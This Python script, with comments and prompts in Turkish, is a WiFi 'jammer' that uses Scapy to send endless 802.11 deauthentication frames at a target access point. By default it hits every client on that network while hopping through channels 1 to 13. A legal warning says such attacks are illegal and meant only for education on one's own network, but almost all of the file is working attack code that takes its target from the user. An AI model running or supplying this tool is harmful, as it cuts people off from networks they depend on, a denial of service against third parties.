# -*- coding: utf-8 -*-
# yedek_jammer.py - DİKKAT: YASA DIŞI KULLANIM! DONANIM GEREKTİRİR!

import os
import sys
import threading
import time
import traceback

# --- Gerekli Kütüphaneyi Kontrol Et ---
try:
    # Scapy kütüphanesini import etmeyi dene
    # Scapy bazen import sırasında uyarılar verebilir, bunları bastıralım
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Scapy uyarılarını gizle
    from scapy.all import * # Scapy fonksiyonlarını import et
    # Scapy'nin kablosuz fonksiyonları için ek modül gerekebilir (Linux'ta genelde gerekmez)
    # conf.verb = 0 # Scapy'nin kendi çıktılarını azalt (isteğe bağlı)
except ImportError:
    print("\nHata: 'scapy' kütüphanesi bulunamadı!")
    print("Bu betiğin çalışması için gereklidir.")
    print("Lütfen kurun: pip install scapy")
    print("Ayrıca Linux sisteminizde 'libpcap-dev' gibi bağımlılıklar gerekebilir.")
    sys.exit(1)

# Renkler (opsiyonel)
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    R = Fore.RED; Y = Fore.YELLOW; G = Fore.GREEN; C = Fore.CYAN; RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
except ImportError:
    R = Y = G = C = RESET = ""
    BOLD = ""

# --- ÇOK ÖNEMLİ YASAL UYARI ve GEREKSİNİMLER ---
print(f"""{R}{BOLD}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!      YASAL UYARI & GEREKSİNİMLER & RİSKLER            !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- WiFi Deauthentication (Deauth) saldırıları yapmak ve başkalarının
  kablosuz ağ bağlantısını kesmek çoğu ülkede KESİNLİKLE YASA DIŞIDIR!
- Bu aracı ASLA size ait olmayan veya test etme izniniz olmayan
  ağlara karşı KULLANMAYIN! Yasal sonuçları çok ağır olabilir.
- Bu araç SADECE eğitim ve kendi ağınızdaki güvenlik açıklarını
  anlama amacıyla kullanılmalıdır.
- Çalışması için GEREKLİ ŞARTLAR:
    1) Linux İşletim Sistemi (Windows/macOS'ta genellikle çalışmaz)
    2) Root Yetkileri (sudo veya root olarak çalıştırma)
    3) 'scapy' Python kütüphanesi (ve bağımlılıkları)
    4) Paket Göndermeyi (Packet Injection) ve Monitor Modunu
       destekleyen UYUMLU bir Kablosuz Ağ Adaptörü (WiFi Kartı).
       Çoğu dahili laptop kartı bunu DESTEKLEMEZ. Harici USB
       adaptörler (örn: Alfa Network) gerekebilir.
- Yanlış kullanılırsa kendi ağınıza veya çevrenizdeki ağlara zarar
  verebilir, bağlantıları kesintiye uğratabilir.
- TÜM SORUMLULUK KULLANICIYA AİTTİR!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
{RESET}""")
try:
    confirm = input(f"{Y}Tüm uyarıları okudum, anladım ve riskleri kabul ediyorum. Devam etmek istiyor musunuz? (e/y): {RESET}").strip().lower()
    if confirm not in ['e', 'y']:
        print(f"{G}İşlem iptal edildi.{RESET}")
        sys.exit()
    elif confirm == 'e':
         print(f"{R}YASADIŞI VE RİSKLİ OLABİLECEK İŞLEM BAŞLATILIYOR...{RESET}")
         time.sleep(2)
    else:
         print(f"{G}İşlem iptal edildi.{RESET}")
         sys.exit()
except KeyboardInterrupt:
    print(f"\n{G}İşlem iptal edildi.{RESET}")
    sys.exit()
# ===========================================================


class WiFiJammerScapy:
    def __init__(self, interface):
        self.interface = interface
        self.stop_signal = threading.Event() # Durdurma sinyali için Event kullan
        self.channel_hopper_thread = None
        self.attack_thread = None

        # Root yetkisi kontrolü (Linux)
        if os.name == 'posix' and os.geteuid() != 0:
             print(f"{R}Hata: Bu betik root yetkileri gerektirir. Lütfen 'sudo python ...' ile çalıştırın.{RESET}")
             sys.exit(1)
        print(f"{C}Arayüz: {self.interface}{RESET}")
        # Arayüzün var olup olmadığını kontrol etmek iyi olurdu (örn: ip link show)
        # Monitor mod desteğini de kontrol etmek gerekir (örn: iwconfig, airmon-ng)
        # Şimdilik bu kontrolleri atlayalım, kullanıcı doğru arayüzü vermeli.
        print(f"{Y}Uyarı: '{self.interface}' arayüzünün monitor modda ve paket göndermeye uygun olduğundan emin olun!{RESET}")
        print(f"{Y}Gerekirse 'sudo airmon-ng start {self.interface}' gibi bir komutla monitor moda alın.{RESET}")


    # Kanal değiştirme fonksiyonu (arka plan thread'i)
    def channel_hopper(self):
        """WiFi kanallarını periyodik olarak değiştirir."""
        thread_name = threading.current_thread().name
        print(f"{C}[{thread_name}] Kanal değiştirici başlatıldı.{RESET}")
        channels = list(range(1, 14)) # 1-13 arası kanallar (yaygın)
        while not self.stop_signal.is_set():
            try:
                for channel in channels:
                    if self.stop_signal.is_set(): break # Durdurma sinyali geldiyse çık
                    # Kanal değiştirme komutu (iwconfig veya iw)
                    # Hata kontrolü ekleyelim
                    cmd = f"iwconfig {self.interface} channel {channel}"
                    # print(f"{C}[{thread_name}] Kanal değiştiriliyor: {channel} ({cmd}){RESET}", end='\r')
                    process = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=False)
                    if process.returncode != 0:
                         # iwconfig yoksa iw dene
                         cmd_iw = f"iw dev {self.interface} set channel {channel}"
                         process_iw = subprocess.run(cmd_iw, shell=True, capture_output=True, text=True, check=False)
                         if process_iw.returncode != 0:
                              print(f"\n{R}[{thread_name}] Hata: Kanal {channel} ayarlanamadı!{RESET}")
                              print(f"{Y}   iwconfig stderr: {process.stderr.strip()}{RESET}")
                              print(f"{Y}   iw stderr: {process_iw.stderr.strip()}{RESET}")
                              # Belki burada durmak daha iyi olur
                              # self.stop_signal.set()
                              # break
                    # Kanallar arasında kısa bir süre bekle
                    time.sleep(0.5)
            except Exception as e:
                 print(f"\n{R}[{thread_name}] Kanal değiştirirken hata: {e}{RESET}")
                 traceback.print_exc()
                 time.sleep(2) # Hata durumunda biraz bekle
            if self.stop_signal.is_set(): break # İç döngüden sonra tekrar kontrol et
        print(f"{Y}[{thread_name}] Kanal değiştirici durduruldu.{RESET}")

    # Deauth saldırı fonksiyonu (arka plan thread'i)
    def deauth_attack(self, target_bssid, target_client="ff:ff:ff:ff:ff:ff", count=0):
        """Belirtilen hedeflere deauth paketleri gönderir."""
        thread_name = threading.current_thread().name
        print(f"{C}[{thread_name}] Deauth saldırısı başlatıldı -> BSSID: {target_bssid}, Client: {target_client}{RESET}")

        # Deauth paketi oluşturma
        # target_client: Saldırılacak istemci MAC adresi ('ff:ff:ff:ff:ff:ff' = broadcast, tüm istemciler)
        # addr1: Hedef (Client MAC)
        # addr2: Kaynak (AP BSSID)
        # addr3: Erişim Noktası (AP BSSID)
        # Dot11: 802.11 Frame başlığı
        # Dot11Deauth: Deauthentication frame (reason=7 -> Class 3 frame received from nonassociated STA)
        # RadioTap: Fiziksel katman bilgisi ekler (Scapy'nin göndermesi için genelde gerekli)
        try:
            # BSSID ve Client MAC adreslerinin geçerliliğini kontrol etmek iyi olurdu
            packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
            # packet.summary() # Paketi görmek için
        except Exception as e:
             print(f"{R}[{thread_name}] Hata: Deauth paketi oluşturulamadı: {e}{RESET}")
             return

        sent_count = 0
        # count=0 ise sonsuza kadar gönder (stop_signal ile durana kadar)
        # count > 0 ise belirtilen sayıda gönder
        print(f"{C}[{thread_name}] Deauth paketleri gönderiliyor... (Durdurmak için Ctrl+C){RESET}")
        while not self.stop_signal.is_set():
            try:
                # Paketi gönder (inter: paketler arası süre sn)
                sendp(packet, iface=self.interface, count=1, inter=0.1, verbose=0) # verbose=0 scapy çıktısını gizler
                sent_count += 1
                print(f"{Y}[{thread_name}] Gönderilen Deauth Paketi: {sent_count}{RESET}", end='\r')

                # Eğer belirli sayıda gönderilecekse kontrol et
                if count > 0 and sent_count >= count:
                    print(f"\n{G}[{thread_name}] Belirtilen sayıda ({count}) deauth paketi gönderildi.{RESET}")
                    break # Görev tamamlandı

            except OSError as e: # Arayüzle ilgili hatalar
                print(f"\n{R}[{thread_name}] Hata: Paket gönderilemedi (OS Error)! Arayüz '{self.interface}' geçerli veya monitor modda olmayabilir.{RESET}")
                print(f"{R}   Detay: {e}{RESET}")
                self.stop_signal.set() # Diğer thread'i de durdur
                break
            except Exception as e:
                 print(f"\n{R}[{thread_name}] Paket gönderirken beklenmedik hata: {e}{RESET}")
                 traceback.print_exc()
                 # Hata durumunda devam etmek yerine durmak daha güvenli olabilir
                 # self.stop_signal.set()
                 # break
                 time.sleep(1) # Hata sonrası kısa bekleme

        print(f"{Y}\n[{thread_name}] Deauth saldırısı durduruldu. Toplam gönderilen: {sent_count}{RESET}")


    def start(self, target_bssid, target_client="ff:ff:ff:ff:ff:ff", packet_count=0, run_channel_hopper=True):
        """Saldırıyı ve kanal değiştiriciyi başlatır."""
        print(f"\n{C}--- WiFi Jammer Başlatılıyor ---{RESET}")
        self.stop_signal.clear() # Önceki sinyali temizle

        # Kanal Değiştirici Thread'i (isteğe bağlı)
        if run_channel_hopper:
            self.channel_hopper_thread = threading.Thread(target=self.channel_hopper, name="ChannelHopper", daemon=True)
            self.channel_hopper_thread.start()
        else:
             print(f"{Y}Kanal değiştirici (Channel Hopper) devre dışı bırakıldı.{RESET}")

        # Saldırı Thread'i
        self.attack_thread = threading.Thread(target=self.deauth_attack, args=(target_bssid, target_client, packet_count), name="DeauthAttacker", daemon=True)
        self.attack_thread.start()

        # Ana thread burada bekleyerek Ctrl+C'yi yakalar
        try:
            while self.attack_thread.is_alive(): # Saldırı thread'i bitene kadar veya Ctrl+C gelene kadar bekle
                self.attack_thread.join(timeout=0.5) # Yarım saniyede bir kontrol et
        except KeyboardInterrupt:
            print(f"\n{Y}Ctrl+C algılandı. Tüm işlemler durduruluyor...{RESET}")
            self.stop()
        except Exception as e:
             print(f"\n{R}Ana bekleme döngüsünde hata: {e}{RESET}")
             self.stop()

    def stop(self):
        """Tüm threadleri durdurur."""
        print(f"{Y}Durdurma sinyali gönderiliyor...{RESET}")
        self.stop_signal.set() # Tüm threadlere durma sinyali ver

        # Threadlerin bitmesini bekle (kısa bir timeout ile)
        if self.channel_hopper_thread and self.channel_hopper_thread.is_alive():
            self.channel_hopper_thread.join(timeout=2)
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=2)
        print(f"{G}Tüm Jammer threadleri durduruldu.{RESET}")


# Ana Çalıştırma Bloğu
if __name__ == "__main__":
    print(f"{C}--- Yedek WiFi Jammer (Scapy ile) ---{RESET}")
    try:
        # Kullanıcıdan arayüz ve hedef bilgisi al
        iface = input(f"{Y}Kullanılacak Monitor Mod Arayüzü (örn: wlan0mon): {RESET}").strip()
        if not iface:
             print(f"{R}Arayüz adı boş olamaz!{RESET}")
             sys.exit(1)

        bssid = input(f"{Y}Hedef Erişim Noktası BSSID (MAC Adresi): {RESET}").strip()
        if not bssid: # Basit kontrol, format kontrolü eklenebilir
             print(f"{R}Hedef BSSID boş olamaz!{RESET}")
             sys.exit(1)

        client = input(f"{Y}Hedef İstemci MAC Adresi [Tüm istemciler için boş bırakın]: {RESET}").strip() or "ff:ff:ff:ff:ff:ff"

        count_str = input(f"{Y}Gönderilecek Deauth Paketi Sayısı [Sonsuz için 0 veya boş bırakın]: {RESET}").strip()
        count = 0
        if count_str:
             try: count = int(count_str)
             except ValueError: print(f"{R}Geçersiz paket sayısı, sonsuz mod (0) kullanılacak.{RESET}"); count = 0

        hopper_choice = input(f"{Y}Kanal Değiştirici (Channel Hopper) çalışsın mı? (e/h) [Varsayılan: e]: {RESET}").strip().lower()
        use_hopper = hopper_choice != 'h'

        # Jammer'ı başlat
        jammer = WiFiJammerScapy(interface=iface)
        jammer.start(target_bssid=bssid, target_client=client, packet_count=count, run_channel_hopper=use_hopper)

    except KeyboardInterrupt:
        print(f"\n{G}Program kullanıcı tarafından sonlandırıldı.{RESET}")
        # Jammer nesnesi oluşturulduysa durdurmayı dene
        if 'jammer' in locals() and jammer:
             jammer.stop()
    except Exception as e:
         print(f"\n{R}{BOLD}Ana programda beklenmedik hata:{RESET}\n{e}")
         traceback.print_exc()
         if 'jammer' in locals() and jammer:
             jammer.stop()

    print(f"\n{G}Yedek Jammer betiği sonlandı.{RESET}")